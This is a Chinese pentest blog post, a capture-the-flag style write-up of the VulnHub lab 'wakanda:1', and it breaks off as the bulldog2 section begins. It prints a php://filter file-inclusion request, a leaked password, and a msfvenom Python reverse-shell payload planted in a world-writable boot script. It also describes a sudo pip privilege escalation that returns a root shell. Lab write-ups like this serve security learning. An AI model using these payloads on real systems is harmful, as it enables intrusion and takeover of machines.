@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="wakanda:1安装和介绍https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;wakanda-1,251&#x2F; ip和端口靶机ip:192.168.1.102 端口信息  拿shell去80端口看下,发现没有可以响应的网页  dirb扫一下  可以看到size都是0,没突破口 再回去看网页源码的时候发现有一行注释 1&lt;!-- &lt;a class&#x3D;&quot;nav-link act">
+<meta property="og:type" content="article">
+<meta property="og:title" content="靶机渗透学习(wakanda,bulldog2)">
+<meta property="og:url" content="http://example.com/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/index.html">
+<meta property="og:site_name" content="blacsheep&#39;s blog">
+<meta property="og:description" content="wakanda:1安装和介绍https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;wakanda-1,251&#x2F; ip和端口靶机ip:192.168.1.102 端口信息  拿shell去80端口看下,发现没有可以响应的网页  dirb扫一下  可以看到size都是0,没突破口 再回去看网页源码的时候发现有一行注释 1&lt;!-- &lt;a class&#x3D;&quot;nav-link act">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/2018/09/2018-09-16-21-21-17%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/09/2018-09-16-21-22-33%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/09/2018-09-16-21-24-05%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/09/2018-09-16-21-25-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/09/2018-09-16-21-27-11%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/09/2018-09-16-21-33-22%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/09/2018-09-16-21-34-22%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/09/2018-09-16-21-36-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/09/2018-09-16-22-04-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/09/2018-09-16-22-06-12%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/09/2018-09-16-22-10-55%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/09/2018-09-16-22-12-44%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/09/2018-09-16-22-14-22%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/09/2018-09-17-14-51-00%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/09/2018-09-17-14-52-46%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/09/2018-09-17-14-54-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/09/2018-09-17-14-56-22%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/09/2018-09-17-14-58-42%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/09/2018-09-17-15-08-55%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/09/2018-09-17-15-14-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="og:image" content="http://example.com/images/2018/09/2018-09-17-15-29-03%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+<meta property="article:published_time" content="2018-09-16T14:15:42.000Z">
+<meta property="article:modified_time" content="2023-07-10T02:13:29.446Z">
+<meta property="article:author" content="blacsheep">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/2018/09/2018-09-16-21-21-17%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>靶机渗透学习(wakanda,bulldog2)</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2018/09/18/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0node1/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2018/09/15/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0cyberry/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/&text=靶机渗透学习(wakanda,bulldog2)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/&title=靶机渗透学习(wakanda,bulldog2)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/&is_video=false&description=靶机渗透学习(wakanda,bulldog2)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=靶机渗透学习(wakanda,bulldog2)&body=Check out this article: http://example.com/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/&title=靶机渗透学习(wakanda,bulldog2)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/&title=靶机渗透学习(wakanda,bulldog2)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/&title=靶机渗透学习(wakanda,bulldog2)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/&title=靶机渗透学习(wakanda,bulldog2)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/&name=靶机渗透学习(wakanda,bulldog2)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/&t=靶机渗透学习(wakanda,bulldog2)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#wakanda-1"><span class="toc-number">1.</span> <span class="toc-text">wakanda:1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E5%92%8C%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">安装和介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ip%E5%92%8C%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.2.</span> <span class="toc-text">ip和端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BFshell"><span class="toc-number">1.3.</span> <span class="toc-text">拿shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bulldog2"><span class="toc-number">2.</span> <span class="toc-text">bulldog2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D%E5%92%8C%E4%B8%8B%E8%BD%BD"><span class="toc-number">2.1.</span> <span class="toc-text">介绍和下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ip%E5%92%8C%E7%AB%AF%E5%8F%A3-1"><span class="toc-number">2.2.</span> <span class="toc-text">ip和端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.3.</span> <span class="toc-text">进一步信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">2.4.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-1"><span class="toc-number">2.5.</span> <span class="toc-text">提权</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        靶机渗透学习(wakanda,bulldog2)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">blacsheep</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-09-16T14:15:42.000Z" class="dt-published" itemprop="datePublished">2018-09-16</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/pentest/">pentest</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="wakanda-1"><a href="#wakanda-1" class="headerlink" title="wakanda:1"></a>wakanda:1</h1><h2 id="安装和介绍"><a href="#安装和介绍" class="headerlink" title="安装和介绍"></a>安装和介绍</h2><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/wakanda-1,251/" title="https://www.vulnhub.com/entry/wakanda-1,251/">https://www.vulnhub.com/entry/wakanda-1,251/</a></p>
+<h2 id="ip和端口"><a href="#ip和端口" class="headerlink" title="ip和端口"></a>ip和端口</h2><p>靶机ip:192.168.1.102 端口信息 <img src="/images/2018/09/2018-09-16-21-21-17%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"></p>
+<h2 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h2><p>去80端口看下,发现没有可以响应的网页 <img src="/images/2018/09/2018-09-16-21-22-33%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"> dirb扫一下 <img src="/images/2018/09/2018-09-16-21-24-05%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"> 可以看到size都是0,没突破口 再回去看网页源码的时候发现有一行注释</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&gt;Fr/a&gt; --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们访问一下,发现页面不一样 <img src="/images/2018/09/2018-09-16-21-25-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"> 猜测存在文件包含,去看下有没有fr.php,发现存在 <img src="/images/2018/09/2018-09-16-21-27-11%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"> 试试文件包含</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/blacsheep# curl &quot;http://192.168.1.102/?lang=php://filter/read=convert.base64-encode/resource=index&quot;  base64 -d</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  3815  100  3815    0     0  3725k      0 --:--:-- --:--:-- --:--:-- 3725k</span><br><span class="line">&lt;?php</span><br><span class="line">$password =&quot;Niamey4Ever227!!!&quot; ;//I have to remember it</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;lang&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">include($_GET[&#x27;lang&#x27;].&quot;.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;description&quot; content=&quot;Vibranium market&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;author&quot; content=&quot;mamadou&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;title&gt;Vibranium Market&lt;/title&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;link href=&quot;bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;link href=&quot;cover.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body class=&quot;text-center&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&gt;</span><br><span class="line">      &lt;header class=&quot;masthead mb-auto&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">          &lt;h3 class=&quot;masthead-brand&quot;&gt;Vibranium Market&lt;/h3&gt;</span><br><span class="line">          &lt;nav class=&quot;nav nav-masthead justify-content-center&quot;&gt;</span><br><span class="line">            &lt;a class=&quot;nav-link active&quot; href=&quot;#&quot;&gt;Home&lt;/a&gt;</span><br><span class="line">            &lt;!-- &lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&gt;Fr/a&gt; --&gt;</span><br><span class="line">          &lt;/nav&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/header&gt;</span><br><span class="line"></span><br><span class="line">      &lt;main role=&quot;main&quot; class=&quot;inner cover&quot;&gt;</span><br><span class="line">        &lt;h1 class=&quot;cover-heading&quot;&gt;Coming soon&lt;/h1&gt;</span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;</span><br><span class="line">          &lt;?php</span><br><span class="line">            if (isset($_GET[&#x27;lang&#x27;]))</span><br><span class="line">          &#123;</span><br><span class="line">          echo $message;</span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">            ?&gt;</span><br><span class="line"></span><br><span class="line">            Next opening of the largest vibranium market. The products come directly from the wakanda. stay tuned!</span><br><span class="line">            &lt;?php</span><br><span class="line">          &#125;</span><br><span class="line">?&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;</span><br><span class="line">          &lt;a href=&quot;#&quot; class=&quot;btn btn-lg btn-secondary&quot;&gt;Learn more&lt;/a&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">      &lt;/main&gt;</span><br><span class="line"></span><br><span class="line">      &lt;footer class=&quot;mastfoot mt-auto&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;inner&quot;&gt;</span><br><span class="line">          &lt;p&gt;Made by&lt;a href=&quot;#&quot;&gt;@mamadou&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/footer&gt;</span><br><span class="line">    &lt;/div&gt;</span><br></pre></td></tr></table></figure>
+
+<p>找到一个密码,去试试ssh 帐号可以用之前页面上的mamadou <img src="/images/2018/09/2018-09-16-21-33-22%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"> 然后连上去了 <img src="/images/2018/09/2018-09-16-21-34-22%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"> 权限是mamadou <img src="/images/2018/09/2018-09-16-21-36-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>先<code>sudo -l</code>一下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:~$ sudo -l</span><br><span class="line">[sudo] password for mamadou: </span><br><span class="line">Sorry, user mamadou may not run sudo on Wakanda1.</span><br></pre></td></tr></table></figure>
+
+<p>帐号没有sudo的权限 找一下线索,读&#x2F;etc&#x2F;passwd发现一个devops用户 找下这个用户的文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:~$ find / -user devops 2&gt;/dev/null</span><br><span class="line">/srv/.antivirus.py</span><br></pre></td></tr></table></figure>
+
+<p>发现一个py文件,看下内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(&#x27;/tmp/test&#x27;,&#x27;w&#x27;).write(&#x27;test&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>猜测是开机运行的脚本,那么看下权限能不能对文件进行修改</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:/srv$ ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  2 root   root      4096 Aug  1 17:52 .</span><br><span class="line">drwxr-xr-x 22 root   root      4096 Aug  1 13:05 ..</span><br><span class="line">-rw-r--rw-  1 devops developer  446 Sep 16 08:41 .antivirus.py</span><br></pre></td></tr></table></figure>
+
+<p>发现其他用户有写权限,那么直接写进木马,用msfvenom生成</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/blacsheep# msfvenom -p cmd/unix/reverse_python lhost=192.168.1.105 lport=4445 R</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload</span><br><span class="line">[-] No arch selected, selecting arch: cmd from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 497 bytes</span><br><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCAgICwgIHN1YnByb2Nlc3MgICAsICBvcyAgICAgOyAgICAgaG9zdD0iMTkyLjE2OC4xLjEwNSIgICAgIDsgICAgIHBvcnQ9NDQ0NSAgICAgOyAgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICAgLCAgc29ja2V0LlNPQ0tfU1RSRUFNKSAgICAgOyAgICAgcy5jb25uZWN0KChob3N0ICAgLCAgcG9ydCkpICAgICA7ICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAsICAwKSAgICAgOyAgICAgb3MuZHVwMihzLmZpbGVubygpICAgLCAgMSkgICAgIDsgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICwgIDIpICAgICA7ICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik=&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后把exec的部分写进去 <img src="/images/2018/09/2018-09-16-22-04-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"> 本地监听然后靶机重启 <img src="/images/2018/09/2018-09-16-22-06-12%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"> 拿到devops权限,然后<code>sudo -l</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">devops@Wakanda1:/$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for devops on Wakanda1:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User devops may run the following commands on Wakanda1:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/pip</span><br></pre></td></tr></table></figure>
+
+<p>发现可以root执行pip,这里有个trick,有个叫做Fakepip的东西可以反弹shell,github:<a target="_blank" rel="noopener" href="https://github.com/0x00-0x00/FakePip" title="https://github.com/0x00-0x00/FakePip">https://github.com/0x00-0x00/FakePip</a> glone下来之后改一下ip,然后写个webshell方便传文件,我们这里写到&#x2F;tmp下面 <img src="/images/2018/09/2018-09-16-22-10-55%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"> 然后监听好,devops执行命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/pip install . --upgrade --force-reinstall</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/2018/09/2018-09-16-22-12-44%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"> 反弹的shell在443收到 <img src="/images/2018/09/2018-09-16-22-14-22%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"></p>
+<h1 id="bulldog2"><a href="#bulldog2" class="headerlink" title="bulldog2"></a>bulldog2</h1><h2 id="介绍和下载"><a href="#介绍和下载" class="headerlink" title="介绍和下载"></a>介绍和下载</h2><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/bulldog-2,246/" title="https://www.vulnhub.com/entry/bulldog-2,246/">https://www.vulnhub.com/entry/bulldog-2,246/</a></p>
+<h2 id="ip和端口-1"><a href="#ip和端口-1" class="headerlink" title="ip和端口"></a>ip和端口</h2><p>靶机ip:192.168.43.121 扫端口 <img src="/images/2018/09/2018-09-17-14-51-00%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="blacsheep"> 只开了80端口</p>
